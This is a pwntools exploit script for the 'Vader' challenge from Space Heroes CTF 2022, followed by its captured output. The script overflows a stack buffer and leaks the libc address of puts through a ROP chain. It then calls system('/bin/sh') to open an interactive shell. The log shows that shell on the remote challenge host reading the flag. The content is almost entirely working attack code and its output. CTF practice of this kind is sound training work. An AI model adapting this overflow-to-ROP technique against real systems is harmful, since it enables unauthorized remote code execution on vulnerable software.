from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './vader'
elf  = ELF(BINARY)

pop_rdi_ret = 0x40165b # pop rdi; ret; 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "0.cloud.chals.io"
  PORT = 20712
  s = remote(HOST, PORT)
  libc = ELF("./libc6_2.33-1_amd64.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  libc = elf.libc

s.recvuntil("Now I am the master >>> ")

buf  = "A"*40
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
s.sendline(buf)


r = s.recvuntil("\n")[:-1]
puts_addr   = u64(r + "\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr   =", hex(puts_addr)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)
print "binsh_addr  =", hex(binsh_addr)

s.recvuntil("Now I am the master >>> ")

buf  = "A"*40
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Vader$ python solve.py r
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Vader/vader'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 0.cloud.chals.io on port 20712: Done
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Vader/libc6_2.33-1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr   = 0x7f43933b9de0
libc_base   = 0x7f4393344000
system_addr = 0x7f439338d850
binsh_addr  = 0x7f43934cc962
[*] Switching to interactive mode
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ ls -l
total 96
-rw-r--r--   1 root   root      185 Feb  3 22:30 -
-rw-r--r--   1 root   root       56 Jan  4 12:14 banner_fail
lrwxrwxrwx   1 root   root        7 Jan 24 01:19 bin -> usr/bin
drwxr-xr-x   2 root   root     4096 Nov 25 12:20 boot
drwxr-xr-x   5 root   root      360 Feb  3 22:30 dev
drwxr-xr-x   1 root   root     4096 Feb  3 22:30 etc
-rw-r--r--   1 root   root       23 Jan 27 14:59 flag.txt
drwxr-xr-x   2 root   root     4096 Nov 25 12:20 home
lrwxrwxrwx   1 root   root        7 Jan 24 01:19 lib -> usr/lib
lrwxrwxrwx   1 root   root        9 Jan 24 01:19 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root        9 Jan 24 01:19 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root       10 Jan 24 01:19 libx32 -> usr/libx32
drwxr-xr-x   2 root   root     4096 Jan 24 01:19 media
drwxr-xr-x   2 root   root     4096 Jan 24 01:19 mnt
drwxr-xr-x   2 root   root     4096 Jan 24 01:19 opt
dr-xr-xr-x 363 nobody nogroup     0 Feb  3 22:30 proc
drwx------   2 root   root     4096 Jan 24 01:19 root
drwxr-xr-x   1 root   root     4096 Jan 24 19:33 run
lrwxrwxrwx   1 root   root        8 Jan 24 01:19 sbin -> usr/sbin
-rw-r--r--   1 root   root      435 Jan  4 12:14 service.conf
-rw-r--r--   1 root   root       48 Jan 28 13:02 sith.txt
drwxr-xr-x   2 root   root     4096 Jan 24 01:19 srv
dr-xr-xr-x  13 nobody nogroup     0 Feb  3 22:30 sys
drwxrwxrwt   1 root   root     4096 Jan 24 19:33 tmp
drwxr-xr-x   1 root   root     4096 Jan 24 01:19 usr
-rwxr-xr-x   1 root   root    20648 Jan 27 00:05 vader
drwxr-xr-x   1 root   root     4096 Jan 24 01:19 var
-rwxr-xr-x   1 root   root       87 Jan 27 14:40 wrapper
$ cat flag.txt
shctf{th3r3-1s-n0-try}
'''
